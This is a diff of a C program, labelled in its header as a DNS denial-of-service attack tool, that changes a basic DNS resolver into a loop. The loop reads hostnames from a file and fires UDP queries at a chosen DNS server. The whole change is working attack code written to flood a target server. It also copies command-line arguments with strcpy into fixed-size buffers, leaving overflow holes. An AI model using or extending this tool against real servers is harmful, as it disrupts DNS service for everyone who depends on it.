@@ -1,8 +1,8 @@
-/**********************************
- * DNS fuck : DNS dos attack tool 
+/*****************++++*****************
+ * DNS fuck      : DNS dos attack tool 
  * Creation date : 2012/12/14     
- * Written by Kousuke Simofuji    
- *********************************/
+ * Written by    : Kousuke Simofuji    
+ **************************************/
 #include<stdio.h>
 #include<string.h>
 #include<stdlib.h>
@@ -19,7 +19,7 @@
 #define T_MX 15 //Mail server
 
 //prototype 
-void ngethostbyname (unsigned char*, unsigned char* , int);
+void dns_attack (unsigned char*, unsigned char*, unsigned char*, int);
 void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
 
 //DNS header structure
@@ -41,7 +41,7 @@ struct DNS_HEADER
 
 	unsigned short q_count; // number of question entries
 	unsigned short ans_count; // number of answer entries
-	unsigned short auth_count; // number of authority entries
+    unsigned short auth_count; // number of authority entries
 	unsigned short add_count; // number of resource entries
 };
 
@@ -84,15 +84,19 @@ int main( int argc , char *argv[])
     int opts;
     unsigned char dns_server[100];
 	unsigned char hostname[100];
+    unsigned char filename[100];
 
     //Parse options
-    while((opts=getopt(argc, argv, "t:q:")) != -1){
+    while((opts=getopt(argc, argv, "t:q:f:")) != -1){
        switch(opts){
           case 't':
              strcpy(dns_server, optarg);
              break;
           case 'q':
              strcpy(hostname, optarg);
+             break;
+          case 'f':
+             strcpy(filename, optarg);
              break;
           default:
              fprintf(stderr, "Unknow option %c\n", opts);
@@ -101,41 +105,30 @@ int main( int argc , char *argv[])
        }
     }
 
-	//Now get the ip of this hostname , A record
-    //hostnameに対してAレコードで引く
-    ngethostbyname(dns_server, hostname , T_A);
-	return 0;
+    //Now get the ip of this hostname , A record
+    dns_attack(dns_server, hostname , filename, T_A);
+    return 0;
 }
 
-
-/*
- * Perform a DNS query by sending a packet
- * */
-void ngethostbyname(unsigned char *dns_server, unsigned char *host , int query_type)
+void dns_attack(unsigned char *dns_server, unsigned char *host , unsigned char *filename, int query_type)
 {
 	unsigned char buf[65536],*qname,*reader;
-	int i , j , stop , s;
-    int count = 0;
-
-	struct sockaddr_in a;
-
+    int sock;
 	struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
-                                                      //DNSサーバの返答を入れる変数
 	struct sockaddr_in dest;
 
 	struct DNS_HEADER *dns = NULL;
 	struct QUESTION *qinfo = NULL;
 
-	printf("Resolving %s" , host);
+    FILE *fp;
 
-	s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries
+	sock = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries
 
 	dest.sin_family = AF_INET;
 	dest.sin_port = htons(53);
 	dest.sin_addr.s_addr = inet_addr(dns_server); //dns servers
 
 	//Set the DNS structure to standard queries
-    //bufをDNS_HEADER構造体のマップする
 	dns = (struct DNS_HEADER *)&buf;
 
 	dns->id = (unsigned short) htons(getpid());
@@ -154,31 +147,38 @@ void ngethostbyname(unsigned char *dns_server, unsigned char *host , int query_t
 	dns->auth_count = 0;
 	dns->add_count = 0;
 
-	//point to the query portion
-    //DNS_HEADER分ずらしてbufをqnameにマップする
-	qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
-
-    //www.google.com to 3www6google3com 
-	ChangetoDnsNameFormat(qname , host);
-    //bufにDNS_HEDERとqname分ずらしてQUESTION構造体にマップする
-	qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
-
-	qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
-	qinfo->qclass = htons(1); //its internet (lol)
-
-    printf("\nSending Packet...");
-    if( sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
-    {
-       perror("sendto failed");
+    //read file list 
+    fp = fopen(filename, "r");
+    if(fp == NULL){
+      perror("cant file open");
+      exit(0);
     }
-    printf("Done");
+
+
+    while(fgets( host, 100, fp) != NULL){
+       //point to the query portion
+       qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
+
+       //translate hostname to dns format
+       ChangetoDnsNameFormat(qname , host);
+       qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
+
+       qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
+       qinfo->qclass = htons(1); //its internet (lol)
+
+       printf("SEND QUERY : %s\n", host);
+       if( sendto(sock,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
+       {
+          perror("sendto failed");
+       }
+    }
+
+    fclose(fp);
 }
 
-
 /*
- * This will convert www.google.com to 3www6google3com 
- * got it :)
- * */
+ * This will convert www.google.com to 3www6google3com got it :)
+ */
 void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
 {
     int lock = 0 , i;
